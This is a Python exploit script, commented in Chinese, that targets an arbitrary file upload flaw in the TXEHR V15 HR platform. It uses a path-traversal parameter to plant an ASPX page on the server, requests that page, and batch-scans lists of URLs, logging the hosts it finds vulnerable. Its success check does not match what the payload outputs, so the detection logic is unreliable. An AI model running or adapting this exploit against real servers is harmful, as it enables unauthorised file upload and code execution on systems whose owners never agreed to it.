import argparse
import requests
import sys

def checkvuln(url):
    attackurl = url + "/MobileService/Web/Handler/hdlUploadFile.ashx?puser=../../../Style/abcd"
    uploadurl = url + "/Style/abcd.aspx"
    data = """
    -----------------------------45250802924973458471174811279
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
Content-Type: image/png

<%@ Page Language="C#"%>
<%
Response.Write(FormsAuthentication.HashPasswordForStoringInConfigFile("123456", "MD5"));
System.IO.File.Delete(Request.PhysicalPath);
%>
-----------------------------45250802924973458471174811279"""
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
               'Content-Type': 'multipart/form-data; boundary=---------------------------45250802924973458471174811279',
               'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'}
    try:
        response = requests.post(attackurl,headers=headers,data=data,timeout=5,verify=False)
        if response.status_code == 200:
            if 'Style/abcd.aspx' in requests.get(uploadurl,headers=headers,timeout=5,verify=False).text:
                print(f'[+]当前网址存在漏洞，且上传文件路径为{uploadurl}')
                with open("TXEHR V15 Upload.txt",'a+') as f:
                    f.write(uploadurl+"\n")
            else:
                print("[-]目标网站不存在漏洞")
        else:
            print("[-]目标网站不存在漏洞")
    except Exception as e :
        print("[-]无法访问目标网站")
#批量检测漏洞
def checkurls(filename):
    with open(filename,'r') as f:
        for readline in f.readlines():
            checkvuln(readline)
def startwith():

    logo = """
 _______   __ _____ _   _ ______   _   _  __   _____   _   _       _                 _ 
|_   _\ \ / /|  ___| | | || ___ \ | | | |/  | |  ___| | | | |     | |               | |
  | |  \ V / | |__ | |_| || |_/ / | | | |`| | |___ \  | | | |_ __ | | ___   __ _  __| |
  | |  /   \ |  __||  _  ||    /  | | | | | |     \ \ | | | | '_ \| |/ _ \ / _` |/ _` |
  | | / /^\ \| |___| | | || |\ \  \ \_/ /_| |_/\__/ / | |_| | |_) | | (_) | (_| | (_| |
  \_/ \/   \/\____/\_| |_/\_| \_|  \___/ \___/\____/   \___/| .__/|_|\___/ \__,_|\__,_|
                                                            | |                        
                                                            |_|                        
    """
    # 修改横幅信息
    print(logo)
    print("同享TXEHR V15人力管理管理平台hdlUploadFile存在任意文件上传漏洞检测工具")


if __name__ == '__main__':
    startwith()
    parser = argparse.ArgumentParser(
        description="This is an any fileupload detection exploitation tool")

    # 添加命令行参数 处理这些参数
    parser.add_argument("-u", "--url", help="Specify the target URL for the attack")
    parser.add_argument("-f", "--file", help="Specify the username file")
    # 调用
    args = parser.parse_args()
    # 根据命令行参数执行相应的功能
    if args.url:
        checkvuln(args.url)
    elif args.file:
        checkurls(args.file)
    else:
        parser.print_help()
